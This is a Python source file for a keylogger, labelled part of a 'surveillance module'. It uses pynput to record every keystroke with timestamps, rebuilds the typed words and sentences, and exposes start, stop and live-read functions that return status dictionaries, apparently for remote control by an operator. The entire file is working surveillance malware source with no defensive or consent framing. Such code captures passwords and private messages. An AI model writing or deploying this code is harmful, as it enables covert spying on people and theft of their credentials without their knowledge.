"""Keylogger functionality for surveillance module"""
import threading
import time
from datetime import datetime
import logging
from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.log = []
        self.running = False
        self.lock = threading.Lock()
        self.listener = None
        self.current_word = ""
        self.current_sentence = ""
        
    def on_press(self, key):
        """Callback for key press events"""
        try:
            with self.lock:
                timestamp = datetime.now().isoformat()
                
                if hasattr(key, 'char'):
                    # Handle regular characters
                    char = key.char
                    self.log.append({
                        'timestamp': timestamp,
                        'type': 'char',
                        'key': char
                    })
                    
                    # Build current word
                    self.current_word += char
                    
                else:
                    # Handle special keys
                    key_str = str(key)
                    self.log.append({
                        'timestamp': timestamp,
                        'type': 'special',
                        'key': key_str
                    })
                    
                    # Handle word boundaries
                    if key_str in ['Key.space', 'Key.enter', 'Key.tab']:
                        if self.current_word:
                            self.current_sentence += self.current_word + " "
                            self.current_word = ""
                    
                    # Handle sentence boundaries
                    elif key_str in ['Key.enter']:
                        if self.current_sentence:
                            self.current_sentence += "\n"
                    
                    # Handle backspace
                    elif key_str == 'Key.backspace':
                        if self.current_word:
                            self.current_word = self.current_word[:-1]
                        elif self.current_sentence and self.current_sentence.endswith(' '):
                            self.current_sentence = self.current_sentence[:-1]
                    
        except Exception as e:
            logging.error(f"Error in keylogger: {str(e)}")
            
    def start(self):
        """Start the keylogger"""
        if not self.running:
            self.running = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            return {'status': 'success', 'message': 'Keylogger started'}
        return {'status': 'error', 'message': 'Keylogger already running'}
            
    def get_current_text(self):
        """Get current text without stopping the keylogger"""
        with self.lock:
            current_text = self.current_sentence + self.current_word
            return {
                'status': 'success',
                'message': 'Current text retrieved',
                'processed_text': current_text.strip(),
                'word_count': len([word for word in current_text.split() if word.strip()]),
                'character_count': len(current_text.strip()),
                'is_running': self.running
            }
    
    def stop(self):
        """Stop the keylogger"""
        if self.running:
            self.running = False
            if self.listener:
                self.listener.stop()
            
            # Add final word if exists
            if self.current_word:
                self.current_sentence += self.current_word
            
            # Clean up the sentence
            final_text = self.current_sentence.strip()
            
            log_copy = self.log.copy()
            self.log.clear()
            self.current_word = ""
            self.current_sentence = ""
            
            return {
                'status': 'success',
                'message': 'Keylogger stopped',
                'data': log_copy,
                'processed_text': final_text,
                'word_count': len([word for word in final_text.split() if word.strip()]),
                'character_count': len(final_text)
            }
        return {'status': 'error', 'message': 'Keylogger not running'}

# Global keylogger instance
_keylogger = None

def start_keylogger():
    """Start the keylogger"""
    global _keylogger
    try:
        if _keylogger is None:
            _keylogger = Keylogger()
        elif _keylogger.running:
            return {
                'status': 'error',
                'message': 'Keylogger already running',
                'timestamp': datetime.now().isoformat(),
                'type': 'surveillance_keylogger'
            }
        
        result = _keylogger.start()
        return {
            'status': 'success',
            'message': 'Keylogger started successfully',
            'timestamp': datetime.now().isoformat(),
            'type': 'surveillance_keylogger'
        }
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

def stop_keylogger():
    """Stop the keylogger and get the log"""
    global _keylogger
    try:
        if _keylogger is not None:
            result = _keylogger.stop()
            _keylogger = None
            return {
                'status': 'success',
                'message': 'Keylogger stopped successfully',
                'data': result.get('data', []),
                'processed_text': result.get('processed_text', ''),
                'word_count': result.get('word_count', 0),
                'character_count': result.get('character_count', 0),
                'timestamp': datetime.now().isoformat(),
                'type': 'surveillance_keylogger'
            }
        return {'status': 'error', 'message': 'Keylogger not initialized'}
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

def get_current_keylogger_text():
    """Get current text from keylogger without stopping it"""
    global _keylogger
    try:
        if _keylogger is not None and _keylogger.running:
            return _keylogger.get_current_text()
        return {'status': 'error', 'message': 'Keylogger not running'}
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

def is_keylogger_running():
    """Check if keylogger is currently running"""
    global _keylogger
    return _keylogger is not None and _keylogger.running 